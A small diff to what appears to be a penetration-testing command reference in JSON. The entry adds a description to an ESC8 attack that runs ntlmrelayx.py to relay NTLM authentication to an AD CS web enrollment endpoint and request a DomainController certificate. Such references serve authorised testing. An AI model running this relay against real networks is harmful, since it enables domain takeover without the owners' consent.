@@ -218,7 +218,8 @@
   "variations": [
     {
       "label": "Coerce to an ADCS relay (ESC8)",
-      "command": "sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
+      "command": "sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
+      "description": "Relays captured NTLM authentication to other services. Instead of cracking captured hashes, forwards the authentication to a target machine for immediate access - no password cracking needed."
     }
   ],
   "steps": [
